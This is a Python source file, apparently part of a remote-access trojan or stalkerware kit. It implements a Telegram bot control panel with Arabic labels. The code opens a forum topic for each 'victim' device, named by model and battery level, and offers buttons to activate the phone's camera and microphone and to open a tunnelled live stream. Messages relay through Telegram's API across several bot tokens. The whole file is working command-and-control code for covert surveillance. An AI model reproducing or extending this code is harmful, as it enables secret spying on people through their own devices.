import threading
import requests
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler

class TelegramUI:
    def __init__(self, bots, monitor):
        self.bots = bots
        self.monitor = monitor
        self.devices = {}

    def start(self):
        for token in self.bots:
            t = threading.Thread(target=self.run_bot, args=(token,))
            t.start()

    def run_bot(self, token):
        updater = Updater(token, use_context=True)
        dp = updater.dispatcher
        dp.add_handler(CommandHandler('start', self.cmd_start))
        dp.add_handler(CommandHandler('check_tunnel', self.cmd_check_tunnel))
        dp.add_handler(CallbackQueryHandler(self.handle_callback))
        updater.start_polling()
        updater.idle()

    def cmd_start(self, update, context):
        chat_id = update.effective_chat.id
        thread_id = update.effective_message.message_thread_id
        if self.monitor.device_id not in self.devices:
            self.devices[self.monitor.device_id] = {'status': 'Online', 'thread_id': thread_id}
        self.show_device_options(update.effective_message, self.monitor.device_id)

    def cmd_check_tunnel(self, update, context):
        chat_id = update.effective_chat.id
        from .web_streamer import setup_tunnel
        url = setup_tunnel(8888)
        context.bot.send_message(chat_id, f"🔍 نتيجة فحص النفق:\n{url}")

    def handle_callback(self, update, context):
        query = update.callback_query
        query.answer()
        data = query.data
        chat_id = query.message.chat_id
        if data.endswith("_cam"):
            device_id = data.split('_')[0]
            query.edit_message_text("📸 جاري تشغيل الكاميرا...")
        elif data.endswith("_mic"):
            device_id = data.split('_')[0]
            query.edit_message_text("🎙️ جاري تشغيل المايك...")
        elif data.endswith("_stream_open"):
            device_id = data.split('_')[0]
            from .web_streamer import setup_tunnel
            url = setup_tunnel(8888)
            query.edit_message_text(f"✅ تم فتح البث:\n`{url}`")
        elif data.endswith("_stream_close"):
            from .web_streamer import stop_tunnel
            status = stop_tunnel()
            query.edit_message_text(status)
        elif data == "back_to_main":
            keyboard = [[InlineKeyboardButton("📱 الأجهزة", callback_data="list_devices")]]
            query.edit_message_text("القائمة الرئيسية", reply_markup=InlineKeyboardMarkup(keyboard))

    def send_message(self, chat_id, text):
        for bot in self.bots:
            try:
                requests.post(f"https://api.telegram.org/bot{bot}/sendMessage", json={'chat_id': chat_id, 'text': text})
                break
            except:
                pass

    def show_device_options(self, message, device_id):
        keyboard = [
            [InlineKeyboardButton("📷 كاميرا", callback_data=f"{device_id}_cam"),
             InlineKeyboardButton("🎙️ مايك", callback_data=f"{device_id}_mic")],
            [InlineKeyboardButton("🌐 فتح البث", callback_data=f"{device_id}_stream_open"),
             InlineKeyboardButton("🛑 إغلاق البث", callback_data=f"{device_id}_stream_close")]
        ]
        message.reply_text(f"🛠️ لوحة تحكم: `{device_id}`", reply_markup=InlineKeyboardMarkup(keyboard), message_thread_id=message.message_thread_id)

    def create_victim_topic(self, chat_id, model, battery):
        token = self.bots[0]
        url = f"https://api.telegram.org/bot{token}/createForumTopic"
        payload = {'chat_id': chat_id, 'name': f"📱 {model} | {battery}%"}
        try:
            r = requests.post(url, json=payload).json()
            if r.get('ok'):
                thread_id = r['result']['message_thread_id']
                self.send_control_panel(chat_id, thread_id, model)
        except Exception:
            pass

    def send_control_panel(self, chat_id, thread_id, device_id):
        keyboard = [
            [InlineKeyboardButton("📷 كاميرا", callback_data=f"{device_id}_cam"),
             InlineKeyboardButton("🎙️ مايك", callback_data=f"{device_id}_mic")],
            [InlineKeyboardButton("🌐 فتح البث", callback_data=f"{device_id}_stream_open"),
             InlineKeyboardButton("🛑 إغلاق البث", callback_data=f"{device_id}_stream_close")]
        ]
        self.devices[device_id] = {'thread_id': thread_id}
        for token in self.bots:
            try:
                bot = Bot(token)
                bot.send_message(chat_id=chat_id, text=f"🎮 لوحة تحكم كاملة للجهاز: `{device_id}`", message_thread_id=thread_id, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
                break
            except:
                continue
